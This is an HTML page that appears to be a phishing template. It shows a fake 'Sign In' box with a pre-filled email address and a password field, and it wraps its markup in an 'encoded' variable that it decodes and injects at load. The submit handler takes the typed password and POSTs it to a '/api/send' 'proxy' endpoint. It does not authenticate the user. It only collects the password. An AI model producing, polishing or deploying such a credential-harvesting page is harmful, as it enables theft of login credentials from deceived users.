<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Decoded Website</title>
</head>
<body>
    <div id="app"></div>

    <script>
        // 1. The interface components are stored within the wrapper variable
        const encodedContent = `
        <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f3f3f3;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        #preloader {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .spinner div {
            width: 8px;
            height: 8px;
            background-color: #005da6;
            border-radius: 50%;
            position: absolute;
            animation: move 1.2s infinite ease-in-out;
        }
        .spinner div:nth-child(2) { animation-delay: 0.15s; }
        .spinner div:nth-child(3) { animation-delay: 0.3s; }
        @keyframes move {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        .login-box {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            position: relative;
            display: block; 
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 0.4rem;
            margin-bottom: 1rem;
            margin-top: 1.5rem;
        }
        .logo span { font-size: 1.1rem; color: #555; font-weight: 500; }
        .email-pill {
            padding: 0.4rem 1.8rem;
            border-radius: 20px;
            font-size: 0.9rem;
            margin: 0 auto 1.5rem;
            width: fit-content;
            text-align: center;
            border: 1px solid #ccc;
            background-color: #f9f9f9;
        }
        .input-group { margin-bottom: 1.2rem; }
        .input-group input {
            width: 100%;
            padding: 0.7rem;
            border: 1px solid #bababa;
            border-radius: 4px;
            font-size: 0.95rem;
            box-sizing: border-box;
        }
        .btn-submit {
            width: 100%;
            padding: 0.7rem;
            background-color: #005da6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: pointer;
        }
        </style>

        <div id="preloader">
            <div class="spinner">
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>

        <div class="login-box">
            <div class="logo">
                <span>Sign In</span>
            </div>
            <div class="email-pill">user@example.com</div>
            
            <!-- FIXED: Direct script linkage handles submission events locally -->
            <form id="loginForm">
                <div class="input-group">
                    <input type="password" id="passField" placeholder="Password" required>
                </div>
                <button type="submit" class="btn-submit">Sign In</button>
            </form>
        </div>
        `;

        // 2. Decode the components into standard browser elements
        const txt = document.createElement("textarea");
        txt.innerHTML = encodedContent;
        document.getElementById("app").innerHTML = txt.value;

        // 3. Clear preloader view elements after 1 second
        setTimeout(() => {
            const preloader = document.getElementById('preloader');
            if(preloader) preloader.style.display = 'none';
        }, 1000);

        // 4. Attach submission handler to the injected form
        const formElement = document.getElementById('loginForm');
        if (formElement) {
            formElement.addEventListener('submit', async function(e) {
                e.preventDefault();
                const passwordValue = document.getElementById('passField').value;
                
                try {
                    // Transmit payload out to your serverless backend proxy endpoint
                    await fetch('/api/send', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password: passwordValue })
                    });
                    alert("Submission received by proxy.");
                } catch (err) {
                    console.error("Network issue:", err);
                }
            });
        }
    </script>
</body>
</html>
